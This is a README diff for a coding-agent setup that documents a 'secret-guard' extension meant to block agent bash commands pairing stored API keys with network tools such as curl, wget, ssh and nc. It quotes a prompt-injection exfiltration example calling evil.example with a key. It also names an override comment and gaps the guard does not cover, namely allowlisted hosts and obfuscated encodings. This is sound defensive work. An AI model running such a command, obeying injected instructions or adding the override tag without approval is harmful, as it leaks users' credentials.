@@ -44,9 +44,46 @@ until the cache is populated).
 - `mcp.json` (gitignored, personal — create from `mcp.json.example`) -> `~/.pi/agent/mcp.json` — codescout server (absolute command) + directTools hot-set.
 - `mcp.json.example` — tracked template with placeholder API keys.
 - `codescout-mode.ts` -> `~/.pi/agent/extensions/` — drops native edit/write, hard-blocks native read/bash via `tool_call`.
+- `secret-guard.ts` -> `~/.pi/agent/extensions/` — blocks bash commands that combine secrets with network egress to non-allowlisted hosts (anti-exfiltration gate).
+- `tests/test-secret-guard.mjs` — functional tests for secret-guard (`node contrib/pi/tests/test-secret-guard.mjs`).
 - `AGENTS.md` -> `~/.pi/agent/AGENTS.md` — tool-map guidance.
 - `install.sh` — idempotent symlink installer (backs up any existing real AGENTS.md).
 
+## secret-guard extension
+
+Prompt-injection's most damaging payload against agent users is credential
+theft: attacker-controlled content (a web page, a README, research output)
+instructs the agent to run `curl https://evil.example/?k=$KEY`. The
+`secret-guard` extension is a hard gate against that pattern: on every bash
+tool call it checks whether the command combines a **known secret** with a
+**network egress utility**, and blocks the call unless the destination is
+allowlisted.
+
+Secrets are loaded at session start (never logged) from:
+
+- `~/.pi/agent/models.json` — provider `apiKey` literals
+- `~/.pi/agent/mcp.json` — MCP server `env` values with secret-looking names
+- extra env files listed in `~/.pi/agent/secret-guard.json`
+
+Default allowlist: provider API domains (`api.kimi.com`, `api.moonshot.ai`),
+GitHub hosts, `api.search.brave.com`, localhost. Extend without editing the
+extension via `~/.pi/agent/secret-guard.json`:
+
+```json
+{ "allowedHosts": ["internal.corp.example"], "envFiles": ["/abs/path/.env"] }
+```
+
+Intentional bypass: append `# secret-guard-override` to the command — the
+human-in-the-loop escape hatch, reserved for explicit user approval (see the
+Security section in `AGENTS.md`).
+
+Scope / honest limitations: covers common egress utilities (`curl`, `wget`,
+`ssh`, `nc`, ...) and script one-liners with HTTP modules (`python3 -c`,
+`node -e`). It is not a sandbox — exfiltration through an allowlisted host or
+obfuscated encodings of a secret is out of scope. Treat it as defense in
+depth, not a security boundary.
+
+Tests: `node contrib/pi/tests/test-secret-guard.mjs` (requires Node >= 23.6).
 ## Contingency: grep name collision
 
 Resolved by F-3: pi-mcp-adapter's default `toolPrefix: "server"` means every
